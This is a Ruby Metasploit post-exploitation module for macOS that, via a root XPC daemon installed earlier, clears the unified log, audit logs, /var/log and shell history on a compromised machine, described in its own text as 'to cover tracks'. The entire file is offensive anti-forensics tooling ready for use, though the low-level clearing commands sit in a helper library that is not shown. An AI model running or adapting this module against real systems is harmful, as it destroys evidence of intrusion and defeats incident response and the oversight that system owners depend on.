require_relative '../../lib/xpc_helper'

class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Post::OSX::XPCDaemon

  def initialize(info = {})
    super(update_info(info,
      'Name'          => 'macOS XPC Anti-Forensics Log Cleaning',
      'Description'   => %q{
        Clears system logs (unified log, audit, var/log) and shell history
        via root XPC daemon to cover tracks.
      },
      'License'       => MSF_LICENSE,
      'Author'        => ['Mr.Gedik'],
      'Platform'      => ['osx'],
      'SessionTypes'  => ['meterpreter', 'shell']
    ))
    register_options([
      OptString.new('TARGET',        [true, 'Log target (all or subsystem name)', 'all']),
      OptBool.new('CLEAR_HISTORY',   [true, 'Also clear shell history files', true]),
    ])
  end

  def run
    unless xpc_client_exists?
      print_error('XPC client not found. Run xpc_daemon_install first.')
      return
    end
    target = datastore['TARGET']
    print_status("Clearing logs: #{target}...")
    result = xpc_exec("lc #{target}")
    if result && result['s'] == '1'
      print_good("Logs cleared")
      print_line(result['d'].to_s) if result['d']
    else
      print_error("Log clean failed")
    end

    if datastore['CLEAR_HISTORY']
      print_status("Clearing shell history...")
      hist = xpc_exec('ch')
      print_good("History cleared") if hist && hist['s'] == '1'
    end
  end
end
